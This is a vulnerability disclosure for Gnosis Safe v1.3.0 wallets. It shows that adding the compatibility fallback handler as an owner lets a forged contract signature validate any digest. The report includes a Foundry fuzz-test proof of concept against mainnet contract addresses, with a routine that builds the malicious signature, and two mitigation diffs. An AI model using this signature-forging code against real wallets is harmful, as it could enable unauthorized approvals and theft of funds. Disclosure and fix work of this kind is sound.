### Title: Wallet signature verification will break

### Brief / Summary
Attacker will be able to steal a user's signature without user's consent. Hence verifying a message / digest like it was really signed by a Safe user /victim. 
This is very dangerous given that it doesnt matter what the digest is, **it verifies** it.
This **Critical state** shouldnt be reachable by the Smart contract. Unfortunately it can.
However, an action is required by an owner for this potential **Critical state** to be reached for attack to be possible.

### Action required by User
The above is achieved if user sets address(FallbackHandler) as one of owners ie in `mapping(address => address) internal owners;`

### Versions Bug is viable
All versions 

### Details
Pls see POC. Code is well explained and simplified.

### POC
For test(Fuzz test) in POC, the following was demonstrated:
1. Initial state where contract signature veification system is still intact / NOT vulnerable. Hence returns false on all fuzz runs.
2. State change by user leading to Vulnerable state of smart contract.
3. At this vulerable state, Safe returns true (wrongly) for all fuzz runs on its signature verification. CRITICAL!!!

**POC**
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GnosisSafe} from "../src/Codeslaw/contracts/GnosisSafe.sol";
import {IGnosisSafeProxyFactory} from "./interfaces/IGnosisSafeProxyFactory.sol";
import {ISafeSetup} from "./interfaces/ISafeSetup.sol";
// consider importing direct 4rm guthub
import {SignatureChecker} from "lib/openzeppelin-contracts/contracts/utils/cryptography/SignatureChecker.sol"; 
import {IGnosisSafe, Enum} from "./interfaces/IGnosisSafe.sol";



contract GnosisSafeSignature is Test {
    using SignatureChecker for address;

    //Mainnet state
    string MAINNET_RPC_URL = "https://mainnet.infura.io/v3/####";
    //Live mainnet Contract / addresses
    address constant COMPATIBILITY_FALLBACK_HANDLER = 0x017062a1dE2FE6b99BE3d9d37841FeD19F573804;
    address constant SAFE_SINGLETON = 0xfb1bffC9d739B8D520DaF37dF666da4C687191EA;
    IGnosisSafeProxyFactory constant SAFE_PROXY_FACTORY =
        IGnosisSafeProxyFactory(0xC22834581EbC8527d974F8a1c97E1bEA4EF910BC);

    //Safe Owner variables
    address EOAOwner;
    uint EOAPrivateKey;
    IGnosisSafe safeV_1_3_0;
   

    function setUp() public {
        //fork MAinnet
        uint forkId = vm.createSelectFork(MAINNET_RPC_URL);
        //make EOA and privateKey for owner
        (EOAOwner,EOAPrivateKey) = makeAddrAndKey("EOAOwner");

        //Building params for calling `SAFE_PROXY_FACTORY::createProxyWithNonce()`
        address[] memory _owners = new address[](1);
        _owners[0] = EOAOwner;
        bytes memory initializer = abi.encodeCall(
            ISafeSetup.setup,
            (_owners, 1, address(0), "", COMPATIBILITY_FALLBACK_HANDLER, address(0), 0, payable(address(0)))
        );
        //deploy safe
        address deployedSafe = SAFE_PROXY_FACTORY.createProxyWithNonce(SAFE_SINGLETON, initializer, 66666666);
        safeV_1_3_0 = IGnosisSafe(payable(deployedSafe));
        //assert correct deployment
        assertEq(EOAOwner,safeV_1_3_0.getOwners()[0]);
        
    }
    /**
    @dev This is a fuzz-test demonstrating that at the aforementioned vulnerable state, there exists a malicious signature that verifies all digest 
    (including bytes32(0)) as if it were rightly signed by user. CRITICAL!!
     */
    function testFuzz_BypassSignatureV_1_3_0(uint _randomDigest) public {
        string memory version = "1.3.0";
        assertEq(version, safeV_1_3_0.VERSION(),"Not expected version (1.3.0)");
        //generate and cache Malicious signature
        bytes memory malicioussignature = generateMaliciousSignature();
        address payable nullPayableAddress;
        Enum.Operation operation = Enum.Operation.wrap(0);
        uint256 nullUint;
        address nullAddress;
        uint256 _nonce = safeV_1_3_0.nonce();

        //Demonstrates signature verification correctly returns false for unsigned digest before state
        //change to address(handler) as owner
        vm.expectRevert();
        bool verified = address(safeV_1_3_0).isValidSignatureNow(bytes32(_randomDigest), malicioussignature); 
        //assert False for verification
        assertFalse(verified);

        //Now change to vulnerable state (adding an owner)
        bytes32 txHash = IGnosisSafe(payable(safeV_1_3_0)).getTransactionHash(
            address(safeV_1_3_0),
            nullUint,
            abi.encodeCall(IGnosisSafe.addOwnerWithThreshold, (COMPATIBILITY_FALLBACK_HANDLER, 1)),
            operation,
            nullUint,
            nullUint,
            nullUint,
            nullAddress,
            nullPayableAddress,
            _nonce
        );
        //sign txHash for safe tx (ie adding an owner)
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(EOAPrivateKey, txHash);
        bytes memory sig = abi.encodePacked(r, s, v);
        //call safe Tx
        safeV_1_3_0.execTransaction(
            address(safeV_1_3_0),
            nullUint,
            abi.encodeCall(IGnosisSafe.addOwnerWithThreshold, (COMPATIBILITY_FALLBACK_HANDLER, 1)),
            operation,
            nullUint,
            nullUint,
            nullUint,
            nullAddress,
            nullPayableAddress,
            sig
        );
        //assert handler address was added to owners array.
        assertTrue(safeV_1_3_0.isOwner(COMPATIBILITY_FALLBACK_HANDLER));

        //Demonstrates any digest will return true as if correctly signed by Safe user.
        //Note that `_randomDigest` is foundry fuzz output, hence can be any value. 
        // ================HENCE ANY VALUE / DIGEST WILL VERIFY. !!!!!==================//
        bool verified2 = address(safeV_1_3_0).isValidSignatureNow(bytes32(_randomDigest), malicioussignature); 
        //assert True for verification
        assertTrue(verified2);


    }

    /**
    @dev Function simply converts an addrress to bytes32 type so as to be encodePacked into r compartment of a signature.
     */
    function AddressToBytes(address _addr) private view returns(bytes32){
        return bytes32(uint256(uint160(_addr)));
    }

    /**
    @dev This function simply generates a malicious signature that bypasses the signature verification algorithm
    of all safe wallets. It encodes and Packs ehe following values at the ffg positions:
    `uint8(1)`                      --------> v
    `bytes32(address(handler))`     --------> r
    `bytes32(s)`                    --------> Doesnt matter the content of s. It still breaks
     */
    function generateMaliciousSignature() private returns (bytes memory) {
        uint8 v = uint8(1);
        bytes32 r = AddressToBytes(COMPATIBILITY_FALLBACK_HANDLER);
        bytes32 s;
        return abi.encodePacked(r, s, v);
    }

    //====Expecting this buys a LAMBO this Xmass. lol
}

```


### Steps to reproduce
- Fetch Mainnet URL and assign in `string MAINNET_RPC_URL;`
- Fectch corresponding interfaces / imports as declared in test file.
- Run foundry command `forge test -vvv --via-ir`

### Mitigation
#### Mitigation1
Its important to note that this mitigation just showcases the root-cause of the bug and may not be mitigated "as is" given the complex nature of safe wallet. Eg: given COMPATIBILITY_FALLBACK_HANDLER may not be valid address on some chains.

```diff
diff --git a/OwnerManager.sol b/OwnerManager.sol
index e31a4a2..f9292d8 100644
--- a/OwnerManager.sol
+++ b/OwnerManager.sol
@@ -15,6 +15,7 @@ abstract contract OwnerManager is SelfAuthorized {
     event ChangedThreshold(uint256 threshold);

     address internal constant SENTINEL_OWNERS = address(0x1);
+    address constant COMPATIBILITY_FALLBACK_HANDLER = 0x017062a1dE2FE6b99BE3d9d37841FeD19F573804;// For mainnet

     mapping(address => address) internal owners;
     uint256 internal ownerCount;
@@ -38,7 +39,7 @@ abstract contract OwnerManager is SelfAuthorized {
         for (uint256 i = 0; i < _owners.length; i++) {
             // Owner address cannot be null.
             address owner = _owners[i];
-            require(owner != address(0) && owner != SENTINEL_OWNERS && owner != address(this) && currentOwner != owner, "GS203");
+            require(owner != address(0) && owner != SENTINEL_OWNERS && owner != address(this) && currentOwner != owner && owner != COMPATIBILITY_FALLBACK_HANDLER, "GS203");
             // No duplicate owners allowed.
             require(owners[owner] == address(0), "GS204");
             owners[currentOwner] = owner;
(END)
```

#### Mitigation2
Mitigation1 was effective in demonstrating the root cause of vulnerability. 
However Mitigation2 (this) may be a preferable / more efficient mitigation in the sense that:
- Future similar bugs can be mitigated without need for redeployment.

```diff
$ git diff
diff --git a/FallbackManager.sol b/FallbackManager.sol
index e661932..b9b3659 100644
--- a/FallbackManager.sol
+++ b/FallbackManager.sol
@@ -17,6 +17,7 @@ contract FallbackManager is SelfAuthorized {
         assembly {
             sstore(slot, handler)
         }
+        setNonOwners(handler);
     }
 
     /// @dev Allows to add a contract to handle fallback calls.
diff --git a/GnosisSafe.sol b/GnosisSafe.sol
index d7bf828..3c9728e 100644
--- a/GnosisSafe.sol
+++ b/GnosisSafe.sol
@@ -82,9 +82,10 @@ contract GnosisSafe is
         uint256 payment,
         address payable paymentReceiver
     ) external {
+        //This be called first b4 setting up owners
+        if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
         // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
         setupOwners(_owners, _threshold);
-        if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
         // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
         setupModules(to, data);

diff --git a/OwnerManager.sol b/OwnerManager.sol
index 3e2231f..f2b64d7 100644
--- a/OwnerManager.sol
+++ b/OwnerManager.sol
@@ -9,10 +9,12 @@ contract OwnerManager is SelfAuthorized {
     event AddedOwner(address owner);
     event RemovedOwner(address owner);
     event ChangedThreshold(uint256 threshold);
+    event NonOwnerAdded(address nonOwner);

     address internal constant SENTINEL_OWNERS = address(0x1);

     mapping(address => address) internal owners;
+    mapping(address => uint) internal nonOwners;
     uint256 internal ownerCount;
     uint256 internal threshold;

@@ -35,6 +37,7 @@ contract OwnerManager is SelfAuthorized {
             require(owner != address(0) && owner != SENTINEL_OWNERS && owner != address(this) && currentOwner != owner, "GS203");
             // No duplicate owners allowed.
             require(owners[owner] == address(0), "GS204");
+            require(nonOwners[owner] != 1);
             owners[currentOwner] = owner;
             currentOwner = owner;
         }
@@ -100,6 +103,7 @@ contract OwnerManager is SelfAuthorized {
         require(newOwner != address(0) && newOwner != SENTINEL_OWNERS && newOwner != address(this), "GS203");
         // No duplicate owners allowed.
         require(owners[newOwner] == address(0), "GS204");
+        require(nonOwners[newOwner] != 1);
         // Validate oldOwner address and check that it corresponds to owner index.
         require(oldOwner != address(0) && oldOwner != SENTINEL_OWNERS, "GS203");
         require(owners[prevOwner] == oldOwner, "GS205");
@@ -146,4 +150,11 @@ contract OwnerManager is SelfAuthorized {
         }
         return array;
     }
+
+    function setNonOwners(address _nonOwner) public authorized {
+        //asserts address innt already an owner else user attention is required
+        require(!isOwner(_nonOwner), "GS###");
+        nonOwners[_nonOwner] = 1;
+        emit NonOwnerAdded(_nonOwner);
+    }
 }
\ No newline at end of file
(END)
```